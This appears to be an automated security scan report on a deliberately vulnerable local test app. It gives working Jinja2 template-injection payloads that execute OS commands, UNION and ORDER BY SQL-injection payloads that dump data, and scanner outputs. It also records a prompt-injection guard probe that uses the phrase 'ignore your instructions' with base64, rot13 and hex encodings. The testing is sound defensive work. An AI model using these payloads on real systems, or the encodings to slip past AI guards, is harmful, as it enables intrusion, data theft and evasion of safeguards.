# Security scan — e2e-strixpaid-verdict

- target: `http://127.0.0.1:8098` (local)
- isolation: direct — no Tor for local targets (Arti has no loopback route)
- strix: strix-paid · 622s · run /opt/ares/strix/strix_runs/test-vuln-hard_c44c
- started 2026-11-09T20:20:48Z · duration 891s

## Findings

### [HIGH] Server-Side Template Injection in POST /render (tpl) leading to unauthenticated RCE

The `/render` endpoint passes the user-supplied `tpl` form field directly to Flask's `render_template_string`, so attacker input is compiled as **Jinja2 template source** rather than bound as data. Any unauthenticated client can submit a template expression and have it evaluated by the server, reaching Python internals through default template globals (`cycler`, `lipsum`, `config`) and executing arbitrary OS commands as the application user.

Agent PoC:

1. Start the application so it listens on `127.0.0.1:8098` (the handler binds loopback only).
2. Confirm the engine is Jinja2 rather than Mako by sending `tpl={{7*7}}` (returns `49`), `tpl={{7*8}}` (returns `56`), `tpl={{7*'7'}}` (returns `7777777`) and the Mako control `tpl=${7*7}` (returned verbatim, proving Mako syntax is inert).
3. Send the gadget-chain payload `tpl={{cycler.__init__.__globals__.os.popen('id').read()}}` as a form-encoded POST body; the response body contains the command output `uid=1000(pentester) gid=1000(pentester) groups=1000(pentester),27(sudo)`.
4. Repeat with an independent chain `tpl={{lipsum.__globals__['os'].popen('hostname').read()}}` and with a `subprocess.check_output` variant to confirm execution is general and not specific to one symbol.
5. Send a marker command `tpl={{lipsum.__globals__['os'].popen('echo SSTI_RCE_PROOF').read()}}`; the unique marker is returned in the response, ruling out coincidental output.
6. Observe the response body equals the command's stdout verbatim in every case; no out-of-band channel is required to read output.

### [MEDIUM] SQL Injection in GET /orders sort parameter (ORDER BY clause)

The `sort` query parameter of `GET /orders` is interpolated directly into an `ORDER BY` clause with an f-string, allowing unauthenticated SQL injection. A quote-free `CASE` expression payload turns the response row ordering into a boolean oracle, which was used to extract the `note` column (`flag{orderby_ok}`, all notes, and the SQLite version) character by character.

Agent PoC:

1. Start the application so it listens on the loopback interface at port 8098.
2. Confirm the baseline ordering with `sort=id`, which returns rows `[[1,...],[2,...],[3,...]]`.
3. Confirm the boolean oracle with a correlated `CASE` expression whose predicate is trivially true: the response order flips to `[[3,...],[2,...],[1,...]]`. Repeat with a false predicate, which leaves the order unchanged.
4. Replace the trivial predicate with one that tests a character of the secret, and binary-search the character code to reconstruct the value of `note` for row 1.
5. Repeat the character-wise extraction for other expressions (all notes, the DBMS version) to show that arbitrary expressions are evaluated.

### [MEDIUM] SQL Injection in POST /orders/by-sku sku JSON field (WHERE clause)

The JSON `sku` field of `POST /orders/by-sku` is interpolated inside single quotes in a `WHERE sku = '{sku}'` clause. A single quote in the JSON body breaks out of the literal, allowing `UNION`-based injection. An unauthenticated client used it to return every row in the table (including rows belonging to other SKUs that the intended query can never match) and to dump the database schema from `sqlite_master`.

Agent PoC:

1. Start the application so it listens on the loopback interface at port 8098.
2. Send a baseline request with `{"sku": "alpha"}` and observe that exactly one row is returned.
3. Send `{"sku": "alpha' AND '1'='2"}` and observe an empty array, confirming the value is evaluated as SQL rather than compared as a string.
4. Send `{"sku": "' UNION SELECT id,sku,note FROM orders--"}` and observe that every row in the table is returned, including SKUs other than the requested one.
5. Send `{"sku": "' UNION SELECT 1,name,sql FROM sqlite_master--"}` and observe the table definition, confirming arbitrary column and table access.

## Secret scan (betterleaks)

- **50 secret leak(s) found** (values redacted)

  - `generic-credential-uri` · /repo/app.log:4866
  - `generic-credential-uri` · /repo/app.log:4866
  - `generic-api-key` · /repo/app.log:5559
  - `generic-credential-uri` · /repo/app.log:8536
  - `generic-credential-uri` · /repo/app.log:8537
  - `generic-credential-uri` · /repo/app.log:8538
  - `generic-credential-uri` · /repo/app.log:8539
  - `generic-credential-uri` · /repo/app.log:8540
  - `generic-credential-uri` · /repo/app.log:8541
  - `generic-credential-uri` · /repo/app.log:8542
  - `generic-credential-uri` · /repo/app.log:8543
  - `generic-credential-uri` · /repo/app.log:8544
  - `generic-credential-uri` · /repo/app.log:8545
  - `generic-credential-uri` · /repo/app.log:8546
  - `generic-credential-uri` · /repo/app.log:8547

## Independent confirmation

- sqlmap: `{"url": "http://127.0.0.1:8098/orders?sort=1", "injectable": true, "rc": 0, "dbms": "SQLite", "techniques": ["boolean-based blind"], "tables": ["orders"], "dump_rc": 0, "dump_rows": 3, "dumped_table": "orders", "sensitive_exposed": true, "sample": ["| 1  | 3   | alpha | flag{orderby_ok} |", "| 2  | 7   | beta  | nothing          |", "| 3  | 1   | gamma | x                |"], "columns": "| id | qty | sku   | note             |"}`
- sqlmap (POST body): not reproduced — no POST body injection reproduced
- injection proof (cmdi/traversal): `{"cmdi": [], "traversal": [], "default_exec": [], "requests": 36}`
- sstimap: `{"url": "http://127.0.0.1:8098/render", "vulnerable": true, "confidence": "high", "engine": "Jinja2", "rce": true, "rc": 0, "post_param": "tpl", "post_data_type": "form", "via": "POST body"}`
- xsstrike: `{"vectors": 0}`
- nmap: `{"host": "127.0.0.1", "port": 8098, "services": [["unknown", "1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :"]], "rc": 0}`
- ffuf: paths=1
- nuclei: hits=0
- metasploit: `{"server": "Werkzeug/3.0.1 Python/3.12.3", "module": null, "rc": 0, "candidates": ["exploit/multi/http/werkzeug_debug_rce", "exploit/multi/http/werkzeug_debug_rce"]}`
- sweep: `{"candidates": 14, "sstimap_hits": [], "sstimap_low": [], "xsstrike_hits": []}`

## Guard-gap probe (tripwire)

- transforms flagged: 100% (flag>=0.6, block>=0.9)
- control ('ignore your instructions'): OK · composite 1.0
- guard gaps (below flag threshold): 0/12
  - identity: mean 0.6 · flag 100% · block 0%
  - base64: mean 0.6 · flag 100% · block 0%
  - base64x2: mean 0.6 · flag 100% · block 0%
  - rot13: mean 0.6 · flag 100% · block 0%
  - hex_escape: mean 0.6 · flag 100% · block 0%
  - unicode_escape: mean 0.6 · flag 100% · block 0%

## Since last scan

- new: 3 · persisting: 0 · resolved: 0 · active: 3
  - NEW [1aca562bde3af4ca] Server-Side Template Injection in POST /render (tpl) leading to unauthenticated RCE
  - NEW [d65cd2b288aeb07c] SQL Injection in GET /orders sort parameter (ORDER BY clause)
  - NEW [04ecb6dd9b3eee01] SQL Injection in POST /orders/by-sku sku JSON field (WHERE clause)

## Receipt

- receipt: `32b653124c145de5874268e45fc7b235f8fd5469b71a5fb8f7942017d9b66e72`
- merkle: `c75654d910a31e709db0c126cd22d6b53e8242f40f56dad33cbdfcb1b6188c11`
- chain_index: 0 · prev: `None`
- artifacts: 19 · diagnostics: 3
- verify: `python3 /opt/ares/okf_receipt.py verify /opt/ares/security_receipts/e2e-strixpaid-verdict/32b653124c145de5.json --files`
